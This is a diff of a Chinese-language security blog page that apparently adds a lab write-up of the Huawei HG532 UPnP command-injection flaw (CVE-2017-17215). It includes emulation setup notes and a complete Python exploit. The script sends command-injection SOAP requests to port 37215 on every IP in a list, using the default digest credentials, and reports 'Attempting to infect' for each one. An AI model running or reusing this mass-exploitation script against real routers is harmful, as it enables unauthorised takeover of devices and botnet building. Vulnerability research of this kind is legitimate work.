@@ -520,6 +520,18 @@
   </li>
 
         
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../路由器的一些环境配置工作/" title="路由器的一些环境配置工作" class="md-nav__link">
+      路由器的一些环境配置工作
+    </a>
+  </li>
+
+        
       </ul>
     </nav>
   </li>
@@ -2017,10 +2029,13 @@ LOAD:00407540                 jalr    $t9 ; snprintf
 LOAD:00407544                 sw      $v0, 0x10($sp)
 LOAD:00407548                 lw      $gp, 0x18($sp)
 LOAD:0040754C                 nop
-LOAD:00407550                 la      $t9, system
+LOAD:00407550                 la      $t9, system #执行system
 </pre></div>
 </td></tr></table>
 
+<p>分析upnp描述信息后 发现该设备支持名为<code>DeviceUpgrade</code>的一种服务类型 设备可以通过这种服务更新固件 具体过程是向<code>“/ctrlt/DeviceUpgrade_1”</code>这个地址提交请求 请求中包含NewStatusURL及NewDownloadURL两个元素。
+远程管理员可以通过该漏洞在设备上执行任意命令 将shell元字符 注入NewStatusURL以及NewDownloadURL元素中</p>
+<p><img alt="img" src="../assets/poc-1568898827379.png" /></p>
 <p>先调用了一个xml相关的函数，获取参数的值，很明显的看到了参数拼接的行为，之后调用了<code>system</code>函数</p>
 <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
 2
@@ -2133,6 +2148,68 @@ UnicodeDecodeError: &#39;ascii&#39; codec can&#39;t decode byte 0xd8 in position
 <p>换了一个磁盘和内核，成功地开启了虚拟机但是网络配置没有成功</p>
 <p><img alt="1568600523894" src="../assets/1568600523894.png" /></p>
 <p>未完待续。。</p>
+<p>修改了一下<code>/etc/network/interfaces</code>成功了</p>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>scp -r ./squashfs-root  root@192.168.104.187:/root
+</pre></div>
+</td></tr></table>
+
+<p>文件拷贝进去</p>
+<p><img alt="1568899195225" src="../assets/1568899195225.png" /></p>
+<p>进入虚拟机之后开启服务</p>
+<p><img alt="1568899403542" src="../assets/1568899403542.png" /></p>
+<p><img alt="1568899461104" src="../assets/1568899461104.png" /></p>
+<p>exp</p>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">threading</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">random</span><span class="o">,</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">array</span><span class="o">,</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">requests.auth</span> <span class="kn">import</span> <span class="n">HTTPDigestAuth</span>
+<span class="n">ips</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s2">&quot;r&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
+<span class="n">cmd</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span> <span class="c1"># Your MIPS (SSHD)</span>
+<span class="n">rm</span> <span class="o">=</span> <span class="s2">&quot;&lt;?xml version=</span><span class="se">\&quot;</span><span class="s2">1.0</span><span class="se">\&quot;</span><span class="s2"> ?&gt;</span><span class="se">\n</span><span class="s2">    &lt;s:Envelope xmlns:s=</span><span class="se">\&quot;</span><span class="s2">http://schemas.xmlsoap.org/soap/envelope/</span><span class="se">\&quot;</span><span class="s2"> s:encodingStyle=</span><span class="se">\&quot;</span><span class="s2">http://schemas.xmlsoap.org/soap/encoding/</span><span class="se">\&quot;</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">    &lt;s:Body&gt;&lt;u:Upgrade xmlns:u=</span><span class="se">\&quot;</span><span class="s2">urn:schemas-upnp-org:service:WANPPPConnection:1</span><span class="se">\&quot;</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">    &lt;NewStatusURL&gt;$(&quot;</span> <span class="o">+</span> <span class="n">cmd</span> <span class="o">+</span> <span class="s2">&quot;)&lt;/NewStatusURL&gt;</span><span class="se">\n</span><span class="s2">&lt;NewDownloadURL&gt;$(echo HUAWEIUPNP)&lt;/NewDownloadURL&gt;</span><span class="se">\n</span><span class="s2">&lt;/u:Upgrade&gt;</span><span class="se">\n</span><span class="s2">    &lt;/s:Body&gt;</span><span class="se">\n</span><span class="s2">    &lt;/s:Envelope&gt;&quot;</span>
+<span class="k">class</span> <span class="nc">exploit</span><span class="p">(</span><span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">):</span>
+        <span class="k">def</span> <span class="fm">__init__</span> <span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ip</span><span class="p">):</span>
+            <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">ip</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+        <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;http://&quot;</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">ip</span> <span class="o">+</span> <span class="s2">&quot;:37215/ctrlt/DeviceUpgrade_1&quot;</span>
+                <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span> <span class="n">auth</span><span class="o">=</span><span class="n">HTTPDigestAuth</span><span class="p">(</span><span class="s1">&#39;dslf-config&#39;</span><span class="p">,</span> <span class="s1">&#39;admin&#39;</span><span class="p">),</span> <span class="n">data</span><span class="o">=</span><span class="n">rm</span><span class="p">)</span>
+                <span class="k">print</span> <span class="s2">&quot;[SOAP] Attempting to infect &quot;</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">ip</span>
+            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+                <span class="k">pass</span>
+<span class="k">for</span> <span class="n">ip</span> <span class="ow">in</span> <span class="n">ips</span><span class="p">:</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">n</span> <span class="o">=</span> <span class="n">exploit</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
+        <span class="n">n</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.03</span><span class="p">)</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">pass</span>
+</pre></div>
+</td></tr></table>
+
+<p>确实成功了</p>
+<p>但是没有虚拟机上没有这个命令emmm</p>
+<p><img alt="1568899744970" src="../assets/1568899744970.png" /></p>
 <h2 id="_3">参考<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
 <p><a href="https://paper.seebug.org/490/">Huawei HG532 系列路由器远程命令执行漏洞分析</a></p>
 <p><a href="https://paper.seebug.org/490/">CVE-2017-17215路由器漏洞分析</a></p>
@@ -2171,13 +2248,13 @@ UnicodeDecodeError: &#39;ascii&#39; codec can&#39;t decode byte 0xd8 in position
           </a>
         
         
-          <a href="../../MISC/" title="一些常见的MISC姿势" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+          <a href="../路由器的一些环境配置工作/" title="路由器的一些环境配置工作" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
             <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
               <span class="md-flex__ellipsis">
                 <span class="md-footer-nav__direction">
                   下一页
                 </span>
-                一些常见的MISC姿势
+                路由器的一些环境配置工作
               </span>
             </div>
             <div class="md-flex__cell md-flex__cell--shrink">
